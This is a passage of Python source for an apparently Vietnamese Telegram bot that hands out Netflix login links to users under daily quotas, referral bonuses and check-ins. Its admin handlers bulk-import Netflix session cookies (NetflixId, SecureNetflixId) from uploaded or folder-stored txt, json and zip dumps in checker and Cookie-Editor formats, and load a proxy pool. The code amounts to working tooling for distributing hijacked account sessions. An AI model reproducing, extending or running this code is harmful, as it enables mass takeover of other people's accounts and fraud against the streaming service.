            buf.seek(0)
            await query.message.reply_photo(
                photo=buf, caption=caption, parse_mode=ParseMode.HTML,
            )
        except Exception as e:
            logger.error(f"donate_binance qr error: {e}")
            await query.message.reply_text(
                caption,
                parse_mode=ParseMode.HTML,
            )
        return

    # -- Admin callbacks (bypass group gate above) --
    if data in ADMIN_CALLBACKS:
        if user.id not in ADMIN_IDS:
            await query.answer(t("admin_denied", lang), show_alert=True)
            return
        if data == "admin_import_cookie":
            context.user_data["await_cookie_file"] = True
            context.user_data["cookie_upload_window"] = time.time() + COOKIE_UPLOAD_WINDOW
            await query.edit_message_text(
                t("admin_import_prompt", lang),
                parse_mode=ParseMode.HTML,
            )
            return
        if data == "admin_loadcookies":
            await cmd_loadcookies(update, context)
            return
        if data == "admin_loadproxy":
            await cmd_loadproxy(update, context)
            return
        if data == "admin_addproxy":
            await cmd_addproxy(update, context)
            return
        if data == "admin_stats":
            bs = get_bot_stats()
            from proxies import get_proxy_stats
            ps = get_proxy_stats()
            await query.edit_message_text(
                t("admin_stats", lang,
                  users=bs['users'], users_today=bs['users_today'],
                  gets_today=bs['gets_today'], gets_total=bs['gets_total'],
                  refs_total=bs['refs_total'], refs_today=bs['refs_today'], checkins_today=bs['checkins_today'],
                  cookies_remaining=bs['cookies_remaining'], cookies_total=bs['cookies_total'],
                  cookies_dead=bs['cookies_dead'], cookies_perm=bs['cookies_perm'],
                  buffer_validated=bs['buffer_validated'], buffer_total=bs['buffer_total'],
                  proxies_live=ps['live'], proxies_file=ps['file_total'], proxies_removed=ps['removed'],
                  codes=bs['codes'], code_uses=bs['code_uses']),
                parse_mode=ParseMode.HTML,
                reply_markup=admin_keyboard(lang),
            )
            return

    # -- Language selection --
    if data in ("lang_vi", "lang_en"):
        chosen = "vi" if data == "lang_vi" else "en"
        set_user_lang(user.id, chosen)
        # Fix: chỉ credit ref khi user ĐÃ đủ nhóm (trước đây credit ngay khi chọn ngôn ngữ)
        missing = await check_user_in_group(context.bot, user.id)
        if missing:
            await query.edit_message_text(
                _join_required_text(chosen, missing),
                parse_mode=ParseMode.HTML,
                reply_markup=join_group_keyboard(chosen, missing),
                disable_web_page_preview=True,
            )
            _track_join_prompt(user.id, query.message.chat_id, query.message.message_id)
            return
        await _process_pending_ref(update, context, chosen)
        name = user.first_name or user.username or "User"
        await query.edit_message_text(
            t("welcome", chosen, name=name, group=GROUP_USERNAME),
            parse_mode=ParseMode.HTML,
            reply_markup=main_keyboard(chosen, user.id),
            disable_web_page_preview=True,
        )
        return

    if data == "change_lang":
        await query.edit_message_text(
            t("lang_prompt", lang),
            reply_markup=lang_keyboard(),
        )
        return

    if data == "ref_input":
        ref_link = f"https://t.me/{BOT_USERNAME.lstrip('@')}?start=ref_{user.id}"
        ref_today = get_ref_today(user.id)
        ref_bonus = get_ref_bonus(user.id)
        total_limit = get_user_daily_limit(user.id)
        await query.edit_message_text(
            t("ref_info", lang,
              ref_link=ref_link,
              ref_today=ref_today, ref_bonus=ref_bonus,
              total_limit=total_limit,
              max_ref=REF_DAILY_CAP,
              bonus_per_ref=REF_BONUS_PER_REF,
              max_bonus=REF_DAILY_CAP * REF_BONUS_PER_REF,
              base_limit=DAILY_LIMIT),
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True,
            reply_markup=back_keyboard(lang),
        )
        return

    if data == "checkin_input":
        await query.edit_message_text(
            _checkin_result_text(lang, user.id),
            parse_mode=ParseMode.HTML,
            reply_markup=back_keyboard(lang),
        )
        return

    if data == "stats_input":
        checkin_bonus = get_checkin_bonus(user.id)
        checkin_streak = get_checkin_streak(user.id)
        used = get_today_uses(user.id)
        limit = get_user_daily_limit(user.id)
        remaining = "∞" if user.id in ADMIN_IDS else get_uses_left(user.id)
        reset = get_next_refill_time(user.id)
        name = user.first_name or user.username or str(user.id)
        await query.edit_message_text(
            t("stats", lang,
              name=name,
              today=datetime.now().strftime("%d/%m/%Y"),
              used=used, limit=limit, remaining=remaining,
              reset=reset.strftime("%H:%M"),
              checkin_streak=checkin_streak, checkin_bonus=checkin_bonus,
              ref_today=get_ref_today(user.id),
              ref_bonus=get_ref_bonus(user.id),
              max_ref=REF_DAILY_CAP,
              bonus_per_ref=REF_BONUS_PER_REF),
            parse_mode=ParseMode.HTML,
            reply_markup=back_keyboard(lang),
        )
        return

    if data == "loginlink_input":
        # Check remaining uses
        uses_left_val = get_uses_left(user.id)
        if uses_left_val <= 0:
            await query.edit_message_text(
                t("no_uses_left", lang),
                parse_mode=ParseMode.HTML,
                reply_markup=back_keyboard(lang),
            )
            return

        await query.edit_message_text(
            t("searching", lang),
            parse_mode=ParseMode.HTML,
        )

        loop = asyncio.get_event_loop()
        link, error, payload = await loop.run_in_executor(
            _executor, _find_and_generate_login_link, user.id, lang
        )

        try:
            if link:
                # Consume use
                bonus = 0
                if consume_use(user.id, 1):
                    use_res = record_use(user.id, username=user.username, first_name=user.first_name)
                    bonus = int((use_res or {}).get("bonus") or 0)

                await query.edit_message_text(
                    _build_loginlink_message(link, payload, user.id, lang, bonus),
                    parse_mode=ParseMode.HTML,
                    disable_web_page_preview=True,
                    reply_markup=result_keyboard(lang),
                )

                # Save active session
                if payload:
                    payload["mode"] = "loginlink"
                    session_id = _save_active_session(user.id, lang, payload)
                    if context.job_queue:
                        _schedule_feedback_prompt(context.job_queue, user.id, lang, session_id)
            else:
                logger.warning(f"[loginlink_input] Login link failed for user {user.id}: {error}")
                await query.edit_message_text(
                    t("link_fail", lang),
                    parse_mode=ParseMode.HTML,
                    reply_markup=result_keyboard(lang),
                )
        except Forbidden:
            logger.warning("User %s has blocked the bot or never started it.", user.id)
        return

    # -- Back --
    if data == "back":
        name = user.first_name or user.username or "User"
        await query.edit_message_text(
            t("welcome", lang, name=name, group=GROUP_USERNAME),
            parse_mode=ParseMode.HTML,
            reply_markup=main_keyboard(lang, user.id),
            disable_web_page_preview=True,
        )
        return

    # -- Back từ message kết quả login link: gửi menu MỚI, giữ nguyên message kết quả --
    if data == "back_new_menu":
        name = user.first_name or user.username or "User"
        await context.bot.send_message(
            chat_id=user.id,
            text=t("welcome", lang, name=name, group=GROUP_USERNAME),
            parse_mode=ParseMode.HTML,
            reply_markup=main_keyboard(lang, user.id),
            disable_web_page_preview=True,
        )
        return

    if data in {"get", "stats", "ref", "help", "buy_uses", "buy_5", "buy_20", "buy_100", "redeem_input"}:
        await query.edit_message_text(
            t("old_features_removed", lang),
            parse_mode=ParseMode.HTML,
            reply_markup=main_keyboard(lang, user.id),
        )
        return



# ═══════════════════════════════════════════════════════════════════
#  Admin: /reload
# ═══════════════════════════════════════════════════════════════════

async def cmd_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    msg = update.effective_message
    if not user or not msg:
        return
    lang = get_user_lang(user.id) or "vi"
    if user.id not in ADMIN_IDS:
        await msg.reply_text(t("not_admin", lang))
        return
    bs = get_bot_stats()
    from proxies import get_proxy_stats
    ps = get_proxy_stats()
    await msg.reply_text(
        t("admin_stats", lang,
          users=bs['users'], users_today=bs['users_today'],
          gets_today=bs['gets_today'], gets_total=bs['gets_total'],
          refs_total=bs['refs_total'], refs_today=bs['refs_today'], checkins_today=bs['checkins_today'],
          cookies_remaining=bs['cookies_remaining'], cookies_total=bs['cookies_total'],
          cookies_dead=bs['cookies_dead'], cookies_perm=bs['cookies_perm'],
          buffer_validated=bs['buffer_validated'], buffer_total=bs['buffer_total'],
          proxies_live=ps['live'], proxies_file=ps['file_total'], proxies_removed=ps['removed'],
          codes=bs['codes'], code_uses=bs['code_uses']),
        parse_mode=ParseMode.HTML,
        reply_markup=admin_keyboard(lang),
    )


def parse_netflix_data(raw_text: str) -> dict:
    """
    Smart parser cho cookie Netflix theo spec:
    - Case-insensitive: chấp nhận netflixid / NETFLIXID / SecureNetflixId ...
    - NetflixId bắt buộc; SecureNetflixId optional (thiếu vẫn hợp lệ)
    - Chỉ loại cookie Netscape khi cột expires (epoch giây) thật sự đã qua.
      KHÔNG dùng dt= trong SecureNetflixId (đó là thời điểm phát hành token, không phải hết hạn).
      Cookie không có cột expires (format dấu chấm phẩy) → giữ hết, bot tự phát hiện khi dùng.
    - Sanitize: strip whitespace, bỏ 1 dấu ';' thừa cuối. KHÔNG bỏ dấu '.' (token Netflix
      hợp lệ kết thúc bằng '.' padding base64url)
    - Hỗ trợ Netscape tab format (Cookie-Editor / CookiesSentinal / checker khác):
      "domain<TAB>flag<TAB>path<TAB>secure<TAB>expiry<TAB>NetflixId<TAB>value"
      - Dòng bắt đầu "#HttpOnly_" là prefix hợp lệ (strip để parse)
      - Gom NetflixId / SecureNetflixId / nfvdid từ nhiều dòng thành 1 cookie
    - Output chuẩn: "NetflixId=...; SecureNetflixId=..."
    """
    result = {"cookie_lines": [], "expired_count": 0, "cookie_count": 0, "skipped": 0}
    cookie_lines: list[str] = []

    def _clean(val) -> str:
        if not val:
            return ""
        v = val.strip()
        if v.endswith(";"):
            v = v[:-1].rstrip()
        return v

    def _ns_expired(expiry_col: str | None) -> bool:
        """Chỉ loại cookie Netscape khi cột expires (epoch giây) đã qua. Thiếu/0 → giữ.
        Hỗ trợ expiry dạng float/scientific (vd '1750000000.0', '1.75e9')."""
        if not expiry_col:
            return False
        try:
            exp = int(expiry_col)
        except (TypeError, ValueError):
            try:
                exp = int(float(expiry_col))
            except (TypeError, ValueError):
                return False
        if exp <= 0:
            return False
        return exp < time.time()

    def _finalize_ns_cookie(cookie: dict | None) -> None:
        """Đóng cookie Netscape đang xây → thêm vào cookie_lines (kèm lọc expired)."""
        if not cookie or not cookie.get("nid"):
            return
        nid = _clean(cookie["nid"])
        if not nid:
            return
        sid = _clean(cookie.get("sid") or "") or None
        nfvdid = _clean(cookie.get("nfvdid") or "") or None
        if _ns_expired(cookie.get("expiry")):
            result["expired_count"] += 1
            return
        parts = [f"NetflixId={nid}"]
        if sid:
            parts.append(f"SecureNetflixId={sid}")
        if nfvdid:
            parts.append(f"nfvdid={nfvdid}")
        cookie_lines.append("; ".join(parts))

    def _netscape_parts(raw: str) -> list[str] | None:
        """Trả về list cột (chuẩn hoá 7 cột) nếu là dòng Netscape (tab ≥ 6 cột, chấp nhận #HttpOnly_).
        Hỗ trợ biến thể 6 cột khi cột name là 'NetflixId=value' (tên+giá trị gộp chung 1 cột)."""
        if not raw:
            return None
        if raw.startswith("#HttpOnly_"):
            raw = raw[len("#HttpOnly_"):]
        if "\t" not in raw:
            return None
        parts = raw.split("\t")
        if len(parts) >= 7:
            return parts
        if len(parts) == 6 and parts[5].strip():
            nv = parts[5].strip()
            name, _, value = nv.partition("=")
            if name.strip() and value.strip():
                return parts[:5] + [name.strip(), value.strip()]
        return None

    lines = raw_text.splitlines()
    ns_current: dict | None = None
    for line in lines:
        raw = line.strip()
        if not raw:
            continue
        if raw.startswith("#") and not raw.startswith("#HttpOnly_"):
            continue

        handled_ns = True
        ns_parts = _netscape_parts(raw)
        if ns_parts:
            name = ns_parts[5].strip().lower()
            value = ns_parts[6].strip()
            if name == "netflixid":
                if ns_current is not None and not ns_current.get("nid"):
                    # Group chờ đang có sid/nfvdid từ trước → hợp nid vào.
                    # Dùng expiry của dòng NetflixId (không phải của nfvdid/sid) để xét hết hạn.
                    ns_current["nid"] = value
                    ns_current["expiry"] = ns_parts[4].strip()
                else:
                    _finalize_ns_cookie(ns_current)
                    ns_current = {"nid": value, "sid": None, "nfvdid": None, "expiry": ns_parts[4].strip()}
            elif name == "securenetflixid":
                if ns_current is not None:
                    ns_current["sid"] = value
                else:
                    # SecureNetflixId đứng TRƯỚC NetflixId → mở group chờ
                    ns_current = {"nid": None, "sid": None, "nfvdid": None, "expiry": ns_parts[4].strip()}
                    ns_current["sid"] = value
            elif name == "nfvdid":
                if ns_current is not None:
                    ns_current["nfvdid"] = value
                else:
                    # nfvdid đứng TRƯỚC NetflixId → mở group chờ
                    ns_current = {"nid": None, "sid": None, "nfvdid": None, "expiry": ns_parts[4].strip()}
                    ns_current["nfvdid"] = value
            else:
                # Cột name không phải cookie Netflix. Nếu dòng vẫn chứa netflixid= (file lỗi)
                # → fall-through sang nhánh raw; ngược lại bỏ qua.
                handled_ns = "netflixid=" not in raw.lower() and "securenetflixid=" not in raw.lower()
        else:
            handled_ns = False
        if handled_ns:
            continue
        _finalize_ns_cookie(ns_current)
        ns_current = None

        # Netscape tab format: gom dòng NetflixId / SecureNetflixId
        nid_m = re.search(r"(?:^|[;\s])netflixid\s*=\s*[\"']?([^\s;\"'\n]+)[\"']?", raw, re.IGNORECASE)
        sid_m = re.search(r"(?:^|[;\s])securenetflixid\s*=\s*[\"']?([^\s;\"'\n]+)[\"']?", raw, re.IGNORECASE)
        nfvdid_m = re.search(r"(?:^|[;\s])nfvdid\s*=\s*[\"']?([^\s;\"'\n]+)[\"']?", raw, re.IGNORECASE)

        if not nid_m:
            # Chỉ đếm skipped khi dòng giống "cookie thật" (key=value, key là tên cookie).
            # Bỏ qua URL / separator / dòng info (ULPfile, HIT header, login link...)
            if re.match(r"^[A-Za-z0-9_.\-]+\s*=", raw):
                result["skipped"] += 1
            continue
        nid = _clean(nid_m.group(1))
        if not nid:
            continue
        sid = _clean(sid_m.group(1)) if sid_m else None
        nfvdid = _clean(nfvdid_m.group(1)) if nfvdid_m else None

        parts = [f"NetflixId={nid}"]
        if sid:
            parts.append(f"SecureNetflixId={sid}")
        if nfvdid:
            parts.append(f"nfvdid={nfvdid}")
        cookie_lines.append("; ".join(parts))

    _finalize_ns_cookie(ns_current)

    result["cookie_lines"] = cookie_lines
    result["cookie_count"] = len(cookie_lines) + result["expired_count"]
    return result


def _json_to_netscape(text: str) -> str:
    """Cookie-Editor JSON array → Netscape text lines (để parse qua nhánh Netscape)."""
    import json as _json

    try:
        obj = _json.loads(text)
    except Exception:
        return ""
    if not isinstance(obj, list):
        return ""

    lines: list[str] = []
    for c in obj:
        if not isinstance(c, dict):
            continue
        name = c.get("name")
        value = c.get("value")
        domain = str(c.get("domain") or "")
        if not name or value is None or not domain:
            continue
        host_only = bool(c.get("hostOnly"))
        if not host_only and not domain.startswith("."):
            domain = "." + domain
        secure = "TRUE" if c.get("secure") else "FALSE"
        exp = c.get("expirationDate")
        try:
            exp = str(int(exp))
        except (TypeError, ValueError):
            exp = "0"
        lines.append(
            f"{domain}\tTRUE\t{c.get('path', '/')}\t{secure}\t{exp}\t{name}\t{value}"
        )

    # NetflixId phải đứng trước SecureNetflixId/nfvdid để parser gom đúng cookie
    order = {"netflixid": 0, "securenetflixid": 1, "nfvdid": 2}
    lines.sort(key=lambda l: order.get(l.split("\t")[5].strip().lower(), 3))
    return "\n".join(lines)


def _process_cookie_lines(cookie_lines: list[str]) -> dict:
    """Dedup theo NetflixId (so với pool RAM), append vào COOKIE_FILE an toàn.
    Returns {"added": N, "duplicate": N}."""
    return add_cookies(cookie_lines)


def _cookie_report_html(total_parsed: int, expired: int, counts: dict, skipped: int = 0, lang: str = "vi") -> str:
    stats = get_cookie_stats()
    return t("cookie_report", lang,
             total_parsed=total_parsed, expired=expired,
             duplicate=counts['duplicate'], added=counts['added'],
             skipped=skipped, pool=stats['remaining'])


def _folder_report_html(total_files: int, deleted: int, added: int, folder: str, skipped: int = 0, lang: str = "vi") -> str:
    stats = get_cookie_stats()
    return t("folder_report", lang,
             folder=folder, files=total_files,
             deleted=deleted, added=added,
             skipped=skipped, pool=stats['remaining'])


async def cmd_addcookie(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    msg = update.effective_message
    if not user or not msg:
        return
    lang = get_user_lang(user.id) or "vi"
    if user.id not in ADMIN_IDS:
        await msg.reply_text(t("not_admin", lang))
        return
    context.user_data["await_cookie_file"] = True
    context.user_data["cookie_upload_window"] = time.time() + COOKIE_UPLOAD_WINDOW
    await msg.reply_text(
        t("admin_import_prompt", lang),
        parse_mode=ParseMode.HTML,
    )


async def handle_cookie_file_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    msg = update.effective_message
    if not user or not msg:
        return
    lang = get_user_lang(user.id) or "vi"
    if user.id not in ADMIN_IDS or not context.user_data.get("await_cookie_file"):
        return

    # Cửa sổ nhận nhiều file: hết 2 phút kể từ lần cuối → tự tắt, bỏ qua file mới
    window = context.user_data.get("cookie_upload_window", 0)
    if time.time() > window:
        context.user_data["await_cookie_file"] = False
        return

    doc = msg.document
    if not doc:
        await msg.reply_text(t("cookie_file_not_received", lang))
        return
    if doc.file_size and doc.file_size > 20_000_000:
        await msg.reply_text(t("cookie_file_too_big", lang))
        return

    fname = (doc.file_name or "").lower()
    try:
        tg_file = await context.bot.get_file(doc.file_id)
        data = await tg_file.download_as_bytearray()
    except Exception as e:
        logger.error(f"Download error: {e}")
        await msg.reply_text(t("cookie_file_download_error", lang, error=escape(str(e))))
        return

    texts: list[str] = []
    file_count = 0
    warned_zip = False
    if fname.endswith(".txt"):
        texts.append(data.decode("utf-8", errors="ignore"))
        file_count = 1
    elif fname.endswith(".json"):
        texts.append(_json_to_netscape(data.decode("utf-8", errors="ignore")))
        file_count = 1
    elif fname.endswith(".zip"):
        try:
            zf = zipfile.ZipFile(io.BytesIO(bytes(data)))
            txt_names = [
                n
                for n in zf.namelist()
                if n.lower().endswith((".txt", ".json")) and not n.startswith("__")
            ]
            if len(txt_names) > ZIP_FILE_LIMIT:
                warned_zip = True
                txt_names = txt_names[:ZIP_FILE_LIMIT]
            file_count = len(txt_names)
            for name in txt_names:
                try:
                    content = zf.read(name).decode("utf-8", errors="ignore")
                    if name.lower().endswith(".json"):
                        content = _json_to_netscape(content)
                    texts.append(content)
                except Exception:
                    pass
        except Exception as e:
            await msg.reply_text(t("cookie_file_zip_error", lang, error=escape(str(e))))
            return
    else:
        await msg.reply_text(t("cookie_file_bad_type", lang))
        return

    all_cookies: list[str] = []
    total_cookies = 0
    expired_total = 0
    skipped_total = 0
    try:
        for text in texts:
            parsed = parse_netflix_data(text)
            all_cookies.extend(parsed["cookie_lines"])
            total_cookies += parsed["cookie_count"]
            expired_total += parsed["expired_count"]
            skipped_total += parsed.get("skipped", 0)
    except Exception as e:
        logger.error(f"Parse error: {e}")
        await msg.reply_text(t("cookie_file_process_error", lang, error=escape(str(e))))
        return

    counts = _process_cookie_lines(all_cookies)

    report = _cookie_report_html(total_cookies, expired_total, counts, skipped_total, lang)
    if warned_zip:
        report = t("cookie_zip_limited", lang, limit=ZIP_FILE_LIMIT) + report
    if counts["added"] == 0 and counts["duplicate"] == 0 and expired_total == 0:
        report += t("cookie_report_empty", lang)
    await msg.reply_text(report)

    # Gia hạn cửa sổ: cho phép file tiếp theo (album / nhiều tin nhắn liên tiếp)
    context.user_data["cookie_upload_window"] = time.time() + COOKIE_UPLOAD_WINDOW


async def cmd_addproxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    msg = update.effective_message
    if not user or not msg:
        return
    lang = get_user_lang(user.id) or "vi"
    if user.id not in ADMIN_IDS:
        await msg.reply_text(t("not_admin", lang))
        return
    context.user_data["await_proxy_file"] = True
    context.user_data["proxy_upload_window"] = time.time() + COOKIE_UPLOAD_WINDOW
    await msg.reply_text(
        t("admin_proxy_prompt", lang),
        parse_mode=ParseMode.HTML,
    )


async def handle_proxy_file_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    msg = update.effective_message
    if not user or not msg:
        return
    lang = get_user_lang(user.id) or "vi"
    if user.id not in ADMIN_IDS or not context.user_data.get("await_proxy_file"):
        return

    window = context.user_data.get("proxy_upload_window", 0)
    if time.time() > window:
        context.user_data["await_proxy_file"] = False
        return

    doc = msg.document
    if not doc:
        await msg.reply_text(t("cookie_file_not_received", lang))
        return
    if doc.file_size and doc.file_size > 20_000_000:
        await msg.reply_text(t("cookie_file_too_big", lang))
        return

    fname = (doc.file_name or "").lower()
    try:
        tg_file = await context.bot.get_file(doc.file_id)
        data = await tg_file.download_as_bytearray()
    except Exception as e:
        logger.error(f"Proxy download error: {e}")
        await msg.reply_text(t("cookie_file_download_error", lang, error=escape(str(e))))
        return

    texts: list[str] = []
    warned_zip = False
    if fname.endswith(".txt") or fname.endswith(".json"):
        texts.append(data.decode("utf-8", errors="ignore"))
    elif fname.endswith(".zip"):
        try:
            zf = zipfile.ZipFile(io.BytesIO(bytes(data)))
            txt_names = [
                n
                for n in zf.namelist()
                if n.lower().endswith((".txt", ".json")) and not n.startswith("__")
            ]
            if len(txt_names) > ZIP_FILE_LIMIT:
                warned_zip = True
                txt_names = txt_names[:ZIP_FILE_LIMIT]
            for name in txt_names:
                try:
                    texts.append(zf.read(name).decode("utf-8", errors="ignore"))
                except Exception:
                    pass
        except Exception as e:
            await msg.reply_text(t("cookie_file_zip_error", lang, error=escape(str(e))))
            return
    else:
        await msg.reply_text(t("cookie_file_bad_type", lang))
        return

    from proxies import PROXY_FILE, add_proxy_lines, get_proxy_stats

    existing: set[str] = set()
    if os.path.exists(PROXY_FILE):
        with open(PROXY_FILE, "r", encoding="utf-8") as f:
            for line in f:
                h = _normalize_proxy(line)
                if h:
                    existing.add(h)

    valid: list[str] = []
    for text in texts:
        for line in text.splitlines():
            h = _normalize_proxy(line)
            if h and h not in valid:
                valid.append(h)

    detected = len(valid)
    to_add = [h for h in valid if h not in existing]
    added = add_proxy_lines(to_add)

    report = t("proxy_chat_report", lang,
               detected=detected, duplicate=detected - added,
               added=added, total=get_proxy_stats()["file_total"])
    if warned_zip:
        report = t("cookie_zip_limited", lang, limit=ZIP_FILE_LIMIT) + report
    if detected == 0:
        report += t("proxy_chat_empty", lang)
    await msg.reply_text(report)

    context.user_data["proxy_upload_window"] = time.time() + COOKIE_UPLOAD_WINDOW


async def handle_document_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    msg = update.effective_message
    if not user or not msg or user.id not in ADMIN_IDS:
        return
    lang = get_user_lang(user.id) or "vi"
    if context.user_data.get("await_proxy_file"):
        await handle_proxy_file_upload(update, context)
    elif context.user_data.get("await_cookie_file"):
        await handle_cookie_file_upload(update, context)
    else:
        await msg.reply_text(t("file_upload_no_state", lang), parse_mode=ParseMode.HTML)


async def cmd_loadcookies(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Quét thư mục Cookies/ (txt/json/zip, đệ quy), nạp cookie mới vào pool,
    tự xóa file trùng hoặc đã xử lý hết. Admin only.
    """
    user = update.effective_user
    msg = update.effective_message
    if not user or not msg:
        return
    lang = get_user_lang(user.id) or "vi"
    if user.id not in ADMIN_IDS:
        await msg.reply_text(t("not_admin", lang))
        return

    folder = os.path.join(BASE_DIR, "Cookies")
    if not os.path.isdir(folder):
        await msg.reply_text(t("folder_empty", lang, folder=folder))
        return

    await msg.reply_text("🔄 Đang quét folder...")
    try:
        res = await asyncio.to_thread(_scan_cookie_folder, folder)
    except Exception as e:
        logger.error(f"Scan cookies error: {e}")
        await msg.reply_text(t("cookie_file_process_error", lang, error=escape(str(e))))
        return

    if res["files"] == 0:
        await msg.reply_text(t("folder_empty", lang, folder=folder))
        return
    report = _folder_report_html(res["files"], res["deleted"], res["added"], folder, res.get("skipped", 0), lang)
    await msg.reply_text(report)


async def cmd_loadproxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Quét thư mục Proxy/ (txt/json/zip, đệ quy), nạp proxy ip:port mới vào
    PROXY_URLS.txt, tự xóa file trùng hoặc đã xử lý hết. Admin only.
    """
    user = update.effective_user
    msg = update.effective_message
    if not user or not msg:
        return
    lang = get_user_lang(user.id) or "vi"
    if user.id not in ADMIN_IDS:
        await msg.reply_text(t("not_admin", lang))
        return

    folder = os.path.join(BASE_DIR, "Proxy")
    if not os.path.isdir(folder):
        try:
            os.makedirs(folder)
        except OSError:
            pass
        await msg.reply_text(t("proxy_empty", lang, folder=folder))
        return

    await msg.reply_text("🔄 Đang quét proxy...")
    try:
        res = await asyncio.to_thread(_scan_proxy_folder, folder)
    except Exception as e:
        logger.error(f"Scan proxy error: {e}")
        await msg.reply_text(t("cookie_file_process_error", lang, error=escape(str(e))))
        return

    if res["files"] == 0:
        await msg.reply_text(t("proxy_empty", lang, folder=folder))
        return
    from proxies import get_proxy_stats
    total = get_proxy_stats()["file_total"]
    await msg.reply_text(
        t("proxy_report", lang, folder=folder, files=res["files"],
          added=res["added"], deleted=res["deleted"], total=total),
    )


def _iter_text_files(folder: str, json_to_netscape: bool = True):
    """Yield (path, [texts]) cho mọi file txt/json/zip trong folder (đệ quy)."""
    for root, dirs, files in os.walk(folder):
        for name in sorted(files):
            path = os.path.join(root, name)
            texts: list[str] = []
            if name.lower().endswith(".txt"):
                with open(path, "r", encoding="utf-8", errors="ignore") as f:
                    texts.append(f.read())
            elif name.lower().endswith(".json"):
                with open(path, "r", encoding="utf-8", errors="ignore") as f:
                    content = f.read()
                    texts.append(_json_to_netscape(content) if json_to_netscape else content)
            elif name.lower().endswith(".zip"):
                try:
                    zf = zipfile.ZipFile(path)
                    for n in zf.namelist():
                        low = n.lower()
                        if n.endswith("/"):
                            continue
                        content = zf.read(n).decode("utf-8", errors="ignore")
                        if low.endswith(".json"):
                            content = _json_to_netscape(content) if json_to_netscape else content
                        elif not low.endswith(".txt"):
                            continue
                        texts.append(content)
                except Exception as e:
                    logger.warning(f"loadfolder: skip bad zip {path}: {e}")
                    continue
            else:
                continue
            yield path, texts


def _remove_empty_dirs(folder: str):
    for root, dirs, files in os.walk(folder, topdown=False):
        for d in dirs:
            try:
                os.rmdir(os.path.join(root, d))
            except OSError:
                pass


def _scan_cookie_folder(folder: str) -> dict:
    """Quét folder đệ quy (txt/json/zip), dedup từng file, xóa file không đóng góp."""
    existing_ids: set[str] = set()
    if os.path.exists(COOKIE_FILE):
        with open(COOKIE_FILE, "r", encoding="utf-8") as f:
            for line in f:
                cid = _extract_netflix_id(line.strip())
                if cid:
                    existing_ids.add(cid)

    total_files = 0
    deleted = 0
    added = 0
    skipped = 0
    to_add: list[str] = []

    for path, texts in _iter_text_files(folder):
        total_files += 1
        file_new = 0
        for text in texts:
            parsed = parse_netflix_data(text)
            skipped += parsed.get("skipped", 0)
            for c in parsed["cookie_lines"]:
                cid = _extract_netflix_id(c)
                if not cid or cid in existing_ids:
                    continue
                existing_ids.add(cid)
                to_add.append(c)
                added += 1
                file_new += 1

        if file_new == 0:
            try:
                os.remove(path)
                deleted += 1
                logger.info(f"loadfolder: deleted processed/duplicate file {path}")
            except OSError as e:
                logger.warning(f"loadfolder: cannot delete {path}: {e}")

    if to_add:
        add_cookies(to_add)

    _remove_empty_dirs(folder)
    return {"files": total_files, "deleted": deleted, "added": added, "skipped": skipped}


_PROXY_SCHEMES = ("http://", "https://", "socks5://", "socks5h://", "socks4://", "socks4a://")


def _normalize_proxy(line: str) -> str:
    """Chuẩn hóa dòng proxy → 'ip:port' hoặc '' (bỏ scheme, loại dòng auth/IPv6/thiếu port)."""
    line = line.strip()
    if not line or line.startswith("#"):
        return ""
    low = line.lower()
    for s in _PROXY_SCHEMES:
        if low.startswith(s):
            line = line[len(s):]
            break
    if "@" in line or "[" in line:
        return ""
    if ":" not in line:
        return ""
    host, _, port = line.rpartition(":")
    if ":" in host:
        return ""
    if not host or not port.isdigit() or not 0 < int(port) < 65536:
        return ""
    if "/" in host or " " in host or "\t" in host:
        return ""
    return f"{host}:{port}"


def _scan_proxy_folder(folder: str) -> dict:
    """Quét folder đệ quy, nạp proxy ip:port mới vào PROXY_URLS.txt, xóa file thừa."""
    from proxies import PROXY_FILE, add_proxy_lines

    existing: set[str] = set()
    if os.path.exists(PROXY_FILE):
        with open(PROXY_FILE, "r", encoding="utf-8") as f:
            for line in f:
                h = _normalize_proxy(line)
                if h:
                    existing.add(h)

    total_files = 0
    deleted = 0
    added = 0
    to_add: list[str] = []

    for path, texts in _iter_text_files(folder, json_to_netscape=False):
        total_files += 1
        file_new = 0
        for text in texts:
            for line in text.splitlines():
                h = _normalize_proxy(line)
                if not h or h in existing:
                    continue
                existing.add(h)
                to_add.append(h)
                added += 1
                file_new += 1

        if file_new == 0:
            try:
                os.remove(path)
                deleted += 1
                logger.info(f"loadproxy: deleted processed/duplicate file {path}")
            except OSError as e:
                logger.warning(f"loadproxy: cannot delete {path}: {e}")

    if to_add:
        add_proxy_lines(to_add)

    _remove_empty_dirs(folder)
    return {"files": total_files, "deleted": deleted, "added": added}


async def cmd_addluot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    msg = update.effective_message
    if not user or not msg:
        return
    lang = get_user_lang(user.id) or "vi"
    if user.id not in ADMIN_IDS:
        await msg.reply_text(t("not_admin", lang))
        return

    if not context.args:
        await msg.reply_text(t("addluot_usage", lang))
        return

    try:
        if len(context.args) == 1:
            target_id = user.id
            amount = int(context.args[0])
        else:
            target_id = int(context.args[0])
            amount = int(context.args[1])
    except ValueError:
        await msg.reply_text(t("addluot_bad_format", lang))
        return

    if amount <= 0:
        await msg.reply_text(t("addluot_positive", lang))
        return

    new_total = add_uses(target_id, amount)
    await msg.reply_text(
        t("addluot_done", lang, amount=amount, target_id=target_id, new_total=new_total),
        parse_mode=ParseMode.HTML,
    )


async def cmd_addcode(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    msg = update.effective_message
    if not user or not msg:
        return
    lang = get_user_lang(user.id) or "vi"
    if user.id not in ADMIN_IDS:
        await msg.reply_text(t("not_admin", lang))
        return

    if len(context.args) < 2:
        await msg.reply_text(t("addcode_usage", lang))
        return

    code = context.args[0].strip()
    try:
        uses = int(context.args[1])
    except ValueError:
        await msg.reply_text(t("addcode_bad_uses", lang))
        return

    claims = 1
    if len(context.args) >= 3:
        try:
            claims = int(context.args[2])
        except ValueError:
